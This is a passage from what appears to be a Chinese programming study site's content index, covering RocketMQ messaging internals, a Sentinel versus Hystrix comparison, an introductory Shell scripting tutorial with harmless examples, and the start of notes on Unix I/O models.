newSingleThreadScheduledExecutor 实现  2.1.5 顺序消息的实现     与定时消息同原理，生产者生产消息时指定特定的 MessageQueue ，消费者消费消息时，消费特定的 MessageQueue，其实单机版的消息中心在一个 MessageQueue 就天然支持了顺序消息 注意：同一个 MessageQueue 保证里面的消息是顺序消费的前提是：消费者是串行的消费该 MessageQueue，因为就算 MessageQueue 是顺序的，但是当并行消费时，还是会有顺序问题，但是串行消费也同时引入了两个问题：    引入锁来实现串行 前一个消费阻塞时后面都会被阻塞   2.1.6 分布式消息的实现     需要前置知识：2PC RocketMQ4.3 起支持，原理为2PC，即两阶段提交，prepared-\u0026gt;commit/rollback 生产者发送事务消息，假设该事务消息 Topic 为 Topic1-Trans，Broker 得到后首先更改该消息的 Topic 为 Topic1-Prepared，该 Topic1-Prepared 对消费者不可见。然后定时回调生产者的本地事务A执行状态，根据本地事务A执行状态，来是否将该消息修改为 Topic1-Commit 或 Topic1-Rollback，消费者就可以正常找到该事务消息或者不执行等   注意，就算是事务消息最后回滚了也不会物理删除，只会逻辑删除该消息\n 2.1.7 消息的 push 实现     注意，RocketMQ 已经说了自己会有低延迟问题，其中就包括这个消息的 push 延迟问题 因为这并不是真正的将消息主动的推送到消费者，而是 Broker 定时任务每5s将消息推送到消费者 pull模式需要我们手动调用consumer拉消息，而push模式则只需要我们提供一个listener即可实现对消息的监听，而实际上，RocketMQ的push模式是基于pull模式实现的，它没有实现真正的push。 push方式里，consumer把轮询过程封装了，并注册MessageListener监听器，取到消息后，唤醒MessageListener的consumeMessage()来消费，对用户而言，感觉消息是被推送过来的。  2.1.8 消息重复发送的避免     RocketMQ 会出现消息重复发送的问题，因为在网络延迟的情况下，这种问题不可避免的发生，如果非要实现消息不可重复发送，那基本太难，因为网络环境无法预知，还会使程序复杂度加大，因此默认允许消息重复发送 RocketMQ 让使用者在消费者端去解决该问题，即需要消费者端在消费消息时支持幂等性的去消费消息 最简单的解决方案是每条消费记录有个消费状态字段，根据这个消费状态字段来判断是否消费或者使用一个集中式的表，来存储所有消息的消费状态，从而避免重复消费 具体实现可以查询关于消息幂等消费的解决方案  2.1.9 广播消费与集群消费     消息消费区别：广播消费，订阅该 Topic 的消息者们都会消费每个消息。集群消费，订阅该 Topic 的消息者们只会有一个去消费某个消息 消息落盘区别：具体表现在消息消费进度的保存上。广播消费，由于每个消费者都独立的去消费每个消息，因此每个消费者各自保存自己的消息消费进度。而集群消费下，订阅了某个 Topic，而旗下又有多个 MessageQueue，每个消费者都可能会去消费不同的 MessageQueue，因此总体的消费进度保存在 Broker 上集中的管理  2.1.10 RocketMQ 不使用 ZooKeeper 作为注册中心的原因，以及自制的 NameServer 优缺点？     ZooKeeper 作为支持顺序一致性的中间件，在某些情况下，它为了满足一致性，会丢失一定时间内的可用性，RocketMQ 需要注册中心只是为了发现组件地址，在某些情况下，RocketMQ 的注册中心可以出现数据不一致性，这同时也是 NameServer 的缺点，因为 NameServer 集群间互不通信，它们之间的注册信息可能会不一致 另外，当有新的服务器加入时，NameServer 并不会立马通知到 Producer，而是由 Producer 定时去请求 NameServer 获取最新的 Broker/Consumer 信息（这种情况是通过 Producer 发送消息时，负载均衡解决）  2.1.11 其它    加分项咯\n 包括组件通信间使用 Netty 的自定义协议 消息重试负载均衡策略（具体参考 Dubbo 负载均衡策略） 消息过滤器（Producer 发送消息到 Broker，Broker 存储消息信息，Consumer 消费时请求 Broker 端从磁盘文件查询消息文件时,在 Broker 端就使用过滤服务器进行过滤） Broker 同步双写和异步双写中 Master 和 Slave 的交互 Broker 在 4.5.0 版本更新中引入了基于 Raft 协议的多副本选举，之前这是商业版才有的特性 ISSUE-1046  3 参考     《RocketMQ技术内幕》：https://blog.csdn.net/prestigeding/article/details/85233529 关于 RocketMQ 对 MappedByteBuffer 的一点优化：https://lishoubo.github.io/2017/09/27/MappedByteBuffer%E7%9A%84%E4%B8%80%E7%82%B9%E4%BC%98%E5%8C%96/ 十分钟入门RocketMQ：https://developer.aliyun.com/article/66101 分布式事务的种类以及 RocketMQ 支持的分布式消息：https://www.infoq.cn/article/2018/08/rocketmq-4.3-release 滴滴出行基于RocketMQ构建企业级消息队列服务的实践：https://yq.aliyun.com/articles/664608 基于《RocketMQ技术内幕》源码注释：https://github.com/LiWenGu/awesome-rocketmq  "},{"id":297,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/sentinel-vs-hystrix/","title":"sentinel-vs-hystrix","parent":"高可用","content":"如何做技术选型？Sentinel 还是 Hystrix？    Sentinel 是阿里中间件团队研发的面向分布式服务架构的轻量级高可用流量控制组件，于 2018 年 7 月正式开源。Sentinel 主要以流量为切入点，从流量控制、熔断降级、系统负载保护等多个维度来帮助用户提升服务的稳定性。大家可能会问：Sentinel 和之前经常用到的熔断降级库 Netflix Hystrix 有什么异同呢？本文将从资源模型和执行模型、隔离设计、熔断降级、实时指标统计设计等角度将 Sentinel 和 Hystrix 进行对比，希望在面临技术选型的时候，对各位开发者能有所帮助。\nSentinel 项目地址：https://github.com/alibaba/Sentinel\n总体说明    先来看一下 Hystrix 的官方介绍：\n Hystrix is a library that helps you control the interactions between these distributed services by adding latency tolerance and fault tolerance logic. Hystrix does this by isolating points of access between the services, stopping cascading failures across them, and providing fallback options, all of which improve your system’s overall resiliency.\n 可以看到 Hystrix 的关注点在于以隔离和熔断为主的容错机制，超时或被熔断的调用将会快速失败，并可以提供 fallback 机制。\n而 Sentinel 的侧重点在于：\n 多样化的流量控制 熔断降级 系统负载保护 实时监控和控制台  两者解决的问题还是有比较大的不同的，下面我们来具体对比一下。\n共同特性    1. 资源模型和执行模型上的对比    Hystrix 的资源模型设计上采用了命令模式，将对外部资源的调用和 fallback 逻辑封装成一个命令对象 HystrixCommand 或 HystrixObservableCommand，其底层的执行是基于 RxJava 实现的。每个 Command 创建时都要指定 commandKey 和 groupKey（用于区分资源）以及对应的隔离策略（线程池隔离 or 信号量隔离）。线程池隔离模式下需要配置线程池对应的参数（线程池名称、容量、排队超时等），然后 Command 就会在指定的线程池按照指定的容错策略执行；信号量隔离模式下需要配置最大并发数，执行 Command 时 Hystrix 就会限制其并发调用。\n注：关于 Hystrix 的详细介绍及代码演示，可以参考本项目高可用架构-Hystrix 部分的详细说明。\nSentinel 的设计则更为简单。相比 Hystrix Command 强依赖隔离规则，Sentinel 的资源定义与规则配置的耦合度更低。Hystrix 的 Command 强依赖于隔离规则配置的原因是隔离规则会直接影响 Command 的执行。在执行的时候 Hystrix 会解析 Command 的隔离规则来创建 RxJava Scheduler 并在其上调度执行，若是线程池模式则 Scheduler 底层的线程池为配置的线程池，若是信号量模式则简单包装成当前线程执行的 Scheduler。\n而 Sentinel 则不一样，开发的时候只需要考虑这个方法/代码是否需要保护，置于用什么来保护，可以任何时候动态实时的区修改。\n从 0.1.1 版本开始，Sentinel 还支持基于注解的资源定义方式，可以通过注解参数指定异常处理函数和 fallback 函数。Sentinel 提供多样化的规则配置方式。除了直接通过 loadRules API 将规则注册到内存态之外，用户还可以注册各种外部数据源来提供动态的规则。用户可以根据系统当前的实时情况去动态地变更规则配置，数据源会将变更推送至 Sentinel 并即时生效。\n2. 隔离设计上的对比    隔离是 Hystrix 的核心功能之一。Hystrix 提供两种隔离策略：线程池隔离 Bulkhead Pattern 和信号量隔离，其中最推荐也是最常用的是线程池隔离。Hystrix 的线程池隔离针对不同的资源分别创建不同的线程池，不同服务调用都发生在不同的线程池中，在线程池排队、超时等阻塞情况时可以快速失败，并可以提供 fallback 机制。线程池隔离的好处是隔离度比较高，可以针对某个资源的线程池去进行处理而不影响其它资源，但是代价就是线程上下文切换的 overhead 比较大，特别是对低延时的调用有比较大的影响。\n但是，实际情况下，线程池隔离并没有带来非常多的好处。最直接的影响，就是会让机器资源碎片化。考虑这样一个常见的场景，在 Tomcat 之类的 Servlet 容器使用 Hystrix，本身 Tomcat 自身的线程数目就非常多了（可能到几十或一百多），如果加上 Hystrix 为各个资源创建的线程池，总共线程数目会非常多（几百个线程），这样上下文切换会有非常大的损耗。另外，线程池模式比较彻底的隔离性使得 Hystrix 可以针对不同资源线程池的排队、超时情况分别进行处理，但这其实是超时熔断和流量控制要解决的问题，如果组件具备了超时熔断和流量控制的能力，线程池隔离就显得没有那么必要了。\nHystrix 的信号量隔离限制对某个资源调用的并发数。这样的隔离非常轻量级，仅限制对某个资源调用的并发数，而不是显式地去创建线程池，所以 overhead 比较小，但是效果不错。但缺点是无法对慢调用自动进行降级，只能等待客户端自己超时，因此仍然可能会出现级联阻塞的情况。\nSentinel 可以通过并发线程数模式的流量控制来提供信号量隔离的功能。并且结合基于响应时间的熔断降级模式，可以在不稳定资源的平均响应时间比较高的时候自动降级，防止过多的慢调用占满并发数，影响整个系统。\n3. 熔断降级的对比    Sentinel 和 Hystrix 的熔断降级功能本质上都是基于熔断器模式 Circuit Breaker Pattern。Sentinel 与 Hystrix 都支持基于失败比率（异常比率）的熔断降级，在调用达到一定量级并且失败比率达到设定的阈值时自动进行熔断，此时所有对该资源的调用都会被 block，直到过了指定的时间窗口后才启发性地恢复。上面提到过，Sentinel 还支持基于平均响应时间的熔断降级，可以在服务响应时间持续飙高的时候自动熔断，拒绝掉更多的请求，直到一段时间后才恢复。这样可以防止调用非常慢造成级联阻塞的情况。\n4. 实时指标统计实现的对比    Hystrix 和 Sentinel 的实时指标数据统计实现都是基于滑动窗口的。Hystrix 1.5 之前的版本是通过环形数组实现的滑动窗口，通过锁配合 CAS 的操作对每个桶的统计信息进行更新。Hystrix 1.5 开始对实时指标统计的实现进行了重构，将指标统计数据结构抽象成了响应式流（reactive stream）的形式，方便消费者去利用指标信息。同时底层改造成了基于 RxJava 的事件驱动模式，在服务调用成功/失败/超时的时候发布相应的事件，通过一系列的变换和聚合最终得到实时的指标统计数据流，可以被熔断器或 Dashboard 消费。\nSentinel 目前抽象出了 Metric 指标统计接口，底层可以有不同的实现，目前默认的实现是基于 LeapArray 的滑动窗口，后续根据需要可能会引入 reactive stream 等实现。\nSentinel 特性    除了之前提到的两者的共同特性之外，Sentinel 还提供以下的特色功能：\n1. 轻量级、高性能    Sentinel 作为一个功能完备的高可用流量管控组件，其核心 sentinel-core 没有任何多余依赖，打包后只有不到 200KB，非常轻量级。开发者可以放心地引入 sentinel-core 而不需担心依赖问题。同时，Sentinel 提供了多种扩展点，用户可以很方便地根据需求去进行扩展，并且无缝地切合到 Sentinel 中。\n引入 Sentinel 带来的性能损耗非常小。只有在业务单机量级超过 25W QPS 的时候才会有一些显著的影响（5% - 10% 左右），单机 QPS 不太大的时候损耗几乎可以忽略不计。\n2. 流量控制    Sentinel 可以针对不同的调用关系，以不同的运行指标（如 QPS、并发调用数、系统负载等）为基准，对资源调用进行流量控制，将随机的请求调整成合适的形状。\nSentinel 支持多样化的流量整形策略，在 QPS 过高的时候可以自动将流量调整成合适的形状。常用的有：\n  直接拒绝模式：即超出的请求直接拒绝。\n  慢启动预热模式：当流量激增的时候，控制流量通过的速率，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。   匀速器模式：利用 Leaky Bucket 算法实现的匀速模式，严格控制了请求通过的时间间隔，同时堆积的请求将会排队，超过超时时长的请求直接被拒绝。Sentinel 还支持基于调用关系的限流，包括基于调用方限流、基于调用链入口限流、关联流量限流等，依托于 Sentinel 强大的调用链路统计信息，可以提供精准的不同维度的限流。   目前 Sentinel 对异步调用链路的支持还不是很好，后续版本会着重改善支持异步调用。\n3. 系统负载保护    Sentinel 对系统的维度提供保护，负载保护算法借鉴了 TCP BBR 的思想。当系统负载较高的时候，如果仍持续让请求进入，可能会导致系统崩溃，无法响应。在集群环境下，网络负载均衡会把本应这台机器承载的流量转发到其它的机器上去。如果这个时候其它的机器也处在一个边缘状态的时候，这个增加的流量就会导致这台机器也崩溃，最后导致整个集群不可用。针对这个情况，Sentinel 提供了对应的保护机制，让系统的入口流量和系统的负载达到一个平衡，保证系统在能力范围之内处理最多的请求。\n4. 实时监控和控制面板    Sentinel 提供 HTTP API 用于获取实时的监控信息，如调用链路统计信息、簇点信息、规则信息等。如果用户正在使用 Spring Boot/Spring Cloud 并使用了 Sentinel Spring Cloud Starter，还可以方便地通过其暴露的 Actuator Endpoint 来获取运行时的一些信息，如动态规则等。未来 Sentinel 还会支持标准化的指标监控 API，可以方便地整合各种监控系统和可视化系统，如 Prometheus、Grafana 等。\nSentinel 控制台（Dashboard）提供了机器发现、配置规则、查看实时监控、查看调用链路信息等功能，使得用户可以非常方便地去查看监控和进行配置。\n5. 生态    Sentinel 目前已经针对 Servlet、Dubbo、Spring Boot/Spring Cloud、gRPC 等进行了适配，用户只需引入相应依赖并进行简单配置即可非常方便地享受 Sentinel 的高可用流量防护能力。未来 Sentinel 还会对更多常用框架进行适配，并且会为 Service Mesh 提供集群流量防护的能力。\n总结       # Sentinel Hystrix     隔离策略 信号量隔离 线程池隔离/信号量隔离   熔断降级策略 基于响应时间或失败比率 基于失败比率   实时指标实现 滑动窗口 滑动窗口（基于 RxJava）   规则配置 支持多种数据源 支持多种数据源   扩展性 多个扩展点 插件的形式   基于注解的支持 支持 支持   限流 基于 QPS，支持基于调用关系的限流 不支持   流量整形 支持慢启动、匀速器模式 不支持   系统负载保护 支持 不支持   控制台 开箱即用，可配置规则、查看秒级监控、机器发现等 不完善   常见框架的适配 Servlet、Spring Cloud、Dubbo、gRPC Servlet、Spring Cloud Netflix    "},{"id":298,"href":"/cs-basics/operating-system/Shell/","title":"Shell","parent":"operating-system","content":" Shell 编程入门  走进 Shell 编程的大门  为什么要学Shell？ 什么是 Shell？ Shell 编程的 Hello World   Shell 变量  Shell 编程中的变量介绍 Shell 字符串入门 Shell 字符串常见操作 Shell 数组   Shell 基本运算符  算数运算符 关系运算符 逻辑运算符 布尔运算符 字符串运算符 文件相关运算符   shell流程控制  if 条件语句 for 循环语句 while 语句   shell 函数  不带参数没有返回值的函数 有返回值的函数 带参数的函数      Shell 编程入门    走进 Shell 编程的大门    为什么要学Shell？    学一个东西，我们大部分情况都是往实用性方向着想。从工作角度来讲，学习 Shell 是为了提高我们自己工作效率，提高产出，让我们在更少的时间完成更多的事情。\n很多人会说 Shell 编程属于运维方面的知识了，应该是运维人员来做，我们做后端开发的没必要学。我觉得这种说法大错特错，相比于专门做Linux运维的人员来说，我们对 Shell 编程掌握程度的要求要比他们低，但是shell编程也是我们必须要掌握的！\n目前Linux系统下最流行的运维自动化语言就是Shell和Python了。\n两者之间，Shell几乎是IT企业必须使用的运维自动化编程语言，特别是在运维工作中的服务监控、业务快速部署、服务启动停止、数据备份及处理、日志分析等环节里，shell是不可缺的。Python 更适合处理复杂的业务逻辑，以及开发复杂的运维软件工具，实现通过web访问等。Shell是一个命令解释器，解释执行用户所输入的命令和程序。一输入命令，就立即回应的交互的对话方式。\n另外，了解 shell 编程也是大部分互联网公司招聘后端开发人员的要求。下图是我截取的一些知名互联网公司对于 Shell 编程的要求。\n什么是 Shell？    简单来说“Shell编程就是对一堆Linux命令的逻辑化处理”。\nW3Cschool 上的一篇文章是这样介绍 Shell的，如下图所示。 Shell 编程的 Hello World    学习任何一门编程语言第一件事就是输出HelloWorld了！下面我会从新建文件到shell代码编写来说下Shell 编程如何输出Hello World。\n(1)新建一个文件 helloworld.sh :touch helloworld.sh，扩展名为 sh（sh代表Shell）（扩展名并不影响脚本执行，见名知意就好，如果你用 php 写 shell 脚本，扩展名就用 php 好了）\n(2) 使脚本具有执行权限：chmod +x helloworld.sh\n(3) 使用 vim 命令修改helloworld.sh文件：vim helloworld.sh(vim 文件\u0026mdash;\u0026mdash;\u0026gt;进入文件\u0026mdash;\u0026ndash;\u0026gt;命令模式\u0026mdash;\u0026mdash;\u0026gt;按i进入编辑模式\u0026mdash;\u0026ndash;\u0026gt;编辑文件 \u0026mdash;\u0026mdash;-\u0026gt;按Esc进入底行模式\u0026mdash;\u0026ndash;\u0026gt;输入:wq/q! （输入wq代表写入内容并退出，即保存；输入q!代表强制退出不保存。）)\nhelloworld.sh 内容如下：\n#!/bin/bash #第一个shell小程序,echo 是linux中的输出命令。 echo \u0026#34;helloworld!\u0026#34; shell中 # 符号表示注释。shell 的第一行比较特殊，一般都会以#!开始来指定使用的 shell 类型。在linux中，除了bash shell以外，还有很多版本的shell， 例如zsh、dash等等\u0026hellip;不过bash shell还是我们使用最多的。\n(4) 运行脚本:./helloworld.sh 。（注意，一定要写成 ./helloworld.sh ，而不是 helloworld.sh ，运行其它二进制的程序也一样，直接写 helloworld.sh ，linux 系统会去 PATH 里寻找有没有叫 helloworld.sh 的，而只有 /bin, /sbin, /usr/bin，/usr/sbin 等在 PATH 里，你的当前目录通常不在 PATH 里，所以写成 helloworld.sh 是会找不到命令的，要用./helloworld.sh 告诉系统说，就在当前目录找。）\nShell 变量    Shell 编程中的变量介绍    Shell编程中一般分为三种变量：\n 我们自己定义的变量（自定义变量）: 仅在当前 Shell 实例中有效，其他 Shell 启动的程序不能访问局部变量。 Linux已定义的环境变量（环境变量， 例如：PATH, ​HOME 等\u0026hellip;, 这类变量我们可以直接使用），使用 env 命令可以查看所有的环境变量，而set命令既可以查看环境变量也可以查看自定义变量。 Shell变量 ：Shell变量是由 Shell 程序设置的特殊变量。Shell 变量中有一部分是环境变量，有一部分是局部变量，这些变量保证了 Shell 的正常运行  常用的环境变量:\n PATH 决定了shell将到哪些目录中寻找命令或程序\nHOME 当前用户主目录\nHISTSIZE　历史记录数\nLOGNAME 当前用户的登录名\nHOSTNAME　指主机的名称\nSHELL 当前用户Shell类型\nLANGUAGE 语言相关的环境变量，多语言可以修改此环境变量\nMAIL　当前用户的邮件存放目录\nPS1　基本提示符，对于root用户是#，对于普通用户是$\n 使用 Linux 已定义的环境变量：\n比如我们要看当前用户目录可以使用：echo $HOME命令；如果我们要看当前用户Shell类型 可以使用echo $SHELL命令。可以看出，使用方法非常简单。\n使用自己定义的变量：\n#!/bin/bash #自定义变量hello hello=\u0026#34;hello world\u0026#34; echo $hello echo \u0026#34;helloworld!\u0026#34; Shell 编程中的变量名的命名的注意事项：\n 命名只能使用英文字母，数字和下划线，首个字符不能以数字开头，但是可以使用下划线（_）开头。 中间不能有空格，可以使用下划线（_）。 不能使用标点符号。 不能使用bash里的关键字（可用help命令查看保留关键字）。  Shell 字符串入门    字符串是shell编程中最常用最有用的数据类型（除了数字和字符串，也没啥其它类型好用了），字符串可以用单引号，也可以用双引号。这点和Java中有所不同。\n单引号字符串：\n#!/bin/bash name=\u0026#39;SnailClimb\u0026#39; hello=\u0026#39;Hello, I am \u0026#39;$name\u0026#39;!\u0026#39; echo $hello 输出内容：\nHello, I am SnailClimb! 双引号字符串：\n#!/bin/bash name=\u0026#39;SnailClimb\u0026#39; hello=\u0026#34;Hello, I am \u0026#34;$name\u0026#34;!\u0026#34; echo $hello 输出内容：\nHello, I am SnailClimb! Shell 字符串常见操作    拼接字符串：\n#!/bin/bash name=\u0026#34;SnailClimb\u0026#34; # 使用双引号拼接 greeting=\u0026#34;hello, \u0026#34;$name\u0026#34; !\u0026#34; greeting_1=\u0026#34;hello, ${name}!\u0026#34; echo $greeting $greeting_1 # 使用单引号拼接 greeting_2=\u0026#39;hello, \u0026#39;$name\u0026#39; !\u0026#39; greeting_3=\u0026#39;hello, ${name} !\u0026#39; echo $greeting_2 $greeting_3 输出结果：\n获取字符串长度：\n#!/bin/bash #获取字符串长度 name=\u0026#34;SnailClimb\u0026#34; # 第一种方式 echo ${#name} #输出 10 # 第二种方式 expr length \u0026#34;$name\u0026#34;; 输出结果:\n10 10 使用 expr 命令时，表达式中的运算符左右必须包含空格，如果不包含空格，将会输出表达式本身:\nexpr 5+6 // 直接输出 5+6 expr 5 + 6 // 输出 11 对于某些运算符，还需要我们使用符号\\进行转义，否则就会提示语法错误。\nexpr 5 * 6 // 输出错误 expr 5 \\* 6 // 输出30 截取子字符串:\n简单的字符串截取：\n#从字符串第 1 个字符开始往后截取 10 个字符 str=\u0026#34;SnailClimb is a great man\u0026#34; echo ${str:0:10} #输出:SnailClimb 根据表达式截取：\n#!bin/bash #author:amau var=\u0026#34;https://www.runoob.com/linux/linux-shell-variable.html\u0026#34; # %表示删除从后匹配, 最短结果 # %%表示删除从后匹配, 最长匹配结果 # #表示删除从头匹配, 最短结果 # ##表示删除从头匹配, 最长匹配结果 # 注: *为通配符, 意为匹配任意数量的任意字符 s1=${var%%t*} #h s2=${var%t*} #https://www.runoob.com/linux/linux-shell-variable.h s3=${var%%.*} #http://www s4=${var#*/} #/www.runoob.com/linux/linux-shell-variable.html s5=${var##*/} #linux-shell-variable.html Shell 数组    bash支持一维数组（不支持多维数组），并且没有限定数组的大小。我下面给了大家一个关于数组操作的 Shell 代码示例，通过该示例大家可以知道如何创建数组、获取数组长度、获取/删除特定位置的数组元素、删除整个数组以及遍历数组。\n#!/bin/bash array=(1 2 3 4 5); # 获取数组长度 length=${#array[@]} # 或者 length2=${#array[*]} #输出数组长度 echo $length #输出：5 echo $length2 #输出：5 # 输出数组第三个元素 echo ${array[2]} #输出：3 unset array[1]# 删除下标为1的元素也就是删除第二个元素 for i in ${array[@]};do echo $i ;done # 遍历数组，输出： 1 3 4 5  unset array; # 删除数组中的所有元素 for i in ${array[@]};do echo $i ;done # 遍历数组，数组元素为空，没有任何输出内容 Shell 基本运算符     说明：图片来自《菜鸟教程》\n Shell 编程支持下面几种运算符\n 算数运算符 关系运算符 布尔运算符 字符串运算符 文件测试运算符  算数运算符    我以加法运算符做一个简单的示例（注意：不是单引号，是反引号）：\n#!/bin/bash a=3;b=3; val=`expr $a + $b` #输出：Total value : 6 echo \u0026#34;Total value : $val\u0026#34; 关系运算符    关系运算符只支持数字，不支持字符串，除非字符串的值是数字。\n通过一个简单的示例演示关系运算符的使用，下面shell程序的作用是当score=100的时候输出A否则输出B。\n#!/bin/bash score=90; maxscore=100; if [ $score -eq $maxscore ] then echo \u0026#34;A\u0026#34; else echo \u0026#34;B\u0026#34; fi 输出结果：\nB 逻辑运算符    示例：\n#!/bin/bash a=$(( 1 \u0026amp;\u0026amp; 0)) # 输出：0；逻辑与运算只有相与的两边都是1，与的结果才是1；否则与的结果是0 echo $a; 布尔运算符    这里就不做演示了，应该挺简单的。\n字符串运算符    简单示例：\n#!/bin/bash a=\u0026#34;abc\u0026#34;; b=\u0026#34;efg\u0026#34;; if [ $a = $b ] then echo \u0026#34;a 等于 b\u0026#34; else echo \u0026#34;a 不等于 b\u0026#34; fi 输出：\na 不等于 b 文件相关运算符    使用方式很简单，比如我们定义好了一个文件路径file=\u0026quot;/usr/learnshell/test.sh\u0026quot; 如果我们想判断这个文件是否可读，可以这样if [ -r $file ] 如果想判断这个文件是否可写，可以这样-w $file，是不是很简单。\nshell流程控制    if 条件语句    简单的 if else-if else 的条件语句示例\n#!/bin/bash a=3; b=9; if [ $a -eq $b ] then echo \u0026#34;a 等于 b\u0026#34; elif [ $a -gt $b ] then echo \u0026#34;a 大于 b\u0026#34; else echo \u0026#34;a 小于 b\u0026#34; fi 输出结果：\na 小于 b 相信大家通过上面的示例就已经掌握了 shell 编程中的 if 条件语句。不过，还要提到的一点是，不同于我们常见的 Java 以及 PHP 中的 if 条件语句，shell if 条件语句中不能包含空语句也就是什么都不做的语句。\nfor 循环语句    通过下面三个简单的示例认识 for 循环语句最基本的使用，实际上 for 循环语句的功能比下面你看到的示例展现的要大得多。\n输出当前列表中的数据：\nfor loop in 1 2 3 4 5 do echo \u0026#34;The value is: $loop\u0026#34; done 产生 10 个随机数：\n#!/bin/bash for i in {0..9}; do echo $RANDOM; done 输出1到5:\n通常情况下 shell 变量调用需要加 $,但是 for 的 (()) 中不需要,下面来看一个例子：\n#!/bin/bash for((i=1;i\u0026lt;=5;i++));do echo $i; done; while 语句    基本的 while 循环语句：\n#!/bin/bash int=1 while(( $int\u0026lt;=5 )) do echo $int let \u0026#34;int++\u0026#34; done while循环可用于读取键盘信息：\necho \u0026#39;按下 \u0026lt;CTRL-D\u0026gt; 退出\u0026#39; echo -n \u0026#39;输入你最喜欢的电影: \u0026#39; while read FILM do echo \u0026#34;是的！$FILM是一个好电影\u0026#34; done 输出内容:\n按下 \u0026lt;CTRL-D\u0026gt; 退出 输入你最喜欢的电影: 变形金刚 是的！变形金刚 是一个好电影 无限循环：\nwhile true do command done shell 函数    不带参数没有返回值的函数    #!/bin/bash hello(){ echo \u0026#34;这是我的第一个 shell 函数!\u0026#34; } echo \u0026#34;-----函数开始执行-----\u0026#34; hello echo \u0026#34;-----函数执行完毕-----\u0026#34; 输出结果：\n-----函数开始执行----- 这是我的第一个 shell 函数! -----函数执行完毕----- 有返回值的函数    输入两个数字之后相加并返回结果：\n#!/bin/bash funWithReturn(){ echo \u0026#34;输入第一个数字: \u0026#34; read aNum echo \u0026#34;输入第二个数字: \u0026#34; read anotherNum echo \u0026#34;两个数字分别为 $aNum和 $anotherNum!\u0026#34; return $(($aNum+$anotherNum)) } funWithReturn echo \u0026#34;输入的两个数字之和为 $?\u0026#34; 输出结果：\n输入第一个数字: 1 输入第二个数字: 2 两个数字分别为 1 和 2 ! 输入的两个数字之和为 3 带参数的函数    #!/bin/bash funWithParam(){ echo \u0026#34;第一个参数为 $1!\u0026#34; echo \u0026#34;第二个参数为 $2!\u0026#34; echo \u0026#34;第十个参数为 $10!\u0026#34; echo \u0026#34;第十个参数为 ${10}!\u0026#34; echo \u0026#34;第十一个参数为 ${11}!\u0026#34; echo \u0026#34;参数总数有 $#个!\u0026#34; echo \u0026#34;作为一个字符串输出所有参数 $*!\u0026#34; } funWithParam 1 2 3 4 5 6 7 8 9 34 73 输出结果：\n第一个参数为 1 ! 第二个参数为 2 ! 第十个参数为 10 ! 第十个参数为 34 ! 第十一个参数为 73 ! 参数总数有 11 个! 作为一个字符串输出所有参数 1 2 3 4 5 6 7 8 9 34 73 ! "},{"id":299,"href":"/%E7%AC%94%E8%AE%B0/Socket/","title":"Socket","parent":"笔记","content":"Socket     Socket  一、I/O 模型  阻塞式 I/O 非阻塞式 I/O I/O 复用 信号驱动 I/O 异步 I/O 五大 I/O 模型比较   二、I/O 复用  select poll 比较 epoll 工作模式 应用场景   参考资料    一、I/O 模型    一个输入操作通常包括两个阶段：\n 等待数据准备好 从内核向进程复制数据  对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。\nUnix 有五种 I/O 模型：\n 阻塞式 I/O 非阻塞式 I/O I/O 复用（select 和 poll） 信号驱动式 I/O（SIGIO） 异步 I/O（AIO）  阻塞式 I/O    应用进程被阻塞，直到数据从内核缓冲区复制到应用进程缓冲区中才返回。\n应该注意到，在阻塞的过程中，其它应用进程还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其它应用进程还可以执行，所以不消耗 CPU 时间，这种模型的 CPU 利用率会比较高。\n下图中，recvfrom() 用于接收 Socket 传来的数据，并复制到应用进程的缓冲区 buf 中。这里把 recvfrom() 当成系统调用。\nssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen); \n非阻塞式 I/O    应用进程执行系统调用之后，内核返回一个错误码。应用进程可以继续执行，但是需要不断的执行系统调用来获知 I/O 是否完成，这种方式称为轮询（polling）。\n由于 CPU 要处理更多的系统调用，因此这种模型的 CPU 利用率比较低。\n\nI/O 复用    使用 select 或者 poll 等待数据，并且可以等待多个套接字中的任何一个变为可读。这一过程会被阻塞，当某一个套接字可读时返回，之后再使用 recvfrom 把数据从内核复制到进程中。\n它可以让单个进程具有处理多个 I/O 事件的能力。又被称为 Event Driven I/O，即事件驱动 I/O。\n如果一个 Web 服务器没有 I/O 复用，那么每一个 Socket 连接都需要创建一个线程去处理。如果同时有几万个连接，那么就需要创建相同数量的线程。相比于多进程和多线程技术，I/O 复用不需要进程线程创建和切换的开销，系统开销更小。\n\n信号驱动 I/O    应用进程使用 sigaction 系统调用，内核立即返回，应用进程可以继续执行，也就是说等待数据阶段应用进程是非阻塞的。内核在数据到达时向应用进程发送 SIGIO 信号，应用进程收到之后在信号处理程序中调用 recvfrom 将数据从内核复制到应用进程中。\n相比于非阻塞式 I/O 的轮询方式，信号驱动 I/O 的 CPU 利用率更高。\n\n异步 I/O    应用进程执行 aio_read 系统调用会立即返回，应用进程可以继续执行，不会被阻塞，内核会在所有操作完成之后向应用进程发送信号。\n异步 I/O 与信号驱动 I/O 的区别在于，异步 I/O 的信号是通知应用进程 I/O 完成，而信号驱动 I/O 的信号是通知应用进程可以开始 I/O。\n\n五大 I/O 模型比较     同步 I/O：将数据从内核缓冲区复制到应用进程缓冲区的阶段（第二阶段），应用进程会阻塞。 异步 I/O：第二阶段应用进程不会阻塞。  同步 I/O 包括阻塞式 I/O、非阻塞式 I/O、I/O 复用和信号驱动 I/O ，它们的主要区别在第一个阶段。\n非阻塞式 I/O 、信号驱动 I/O 和异步 I/O 在第一阶段不会阻塞。\n\n二、I/O 复用    select/poll/epoll 都是 I/O 多路复用的具体实现，select 出现的最早，之后是 poll，再是 epoll。\nselect    int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); select 允许应用程序监视一组文件描述符，等待一个或者多个描述符成为就绪状态，从而完成 I/O 操作。\n  fd_set 使用数组实现，数组大小使用 FD_SETSIZE 定义，所以只能监听少于 FD_SETSIZE 数量的描述符。有三种类型的描述符类型：readset、writeset、exceptset，分别对应读、写、异常条件的描述符集合。\n  timeout 为超时参数，调用 select 会一直阻塞直到有描述符的事件到达或者等待的时间超过 timeout。\n  成功调用返回结果大于 0，出错返回结果为 -1，超时返回结果为 0。\n  fd_set fd_in, fd_out; struct timeval tv; // Reset the 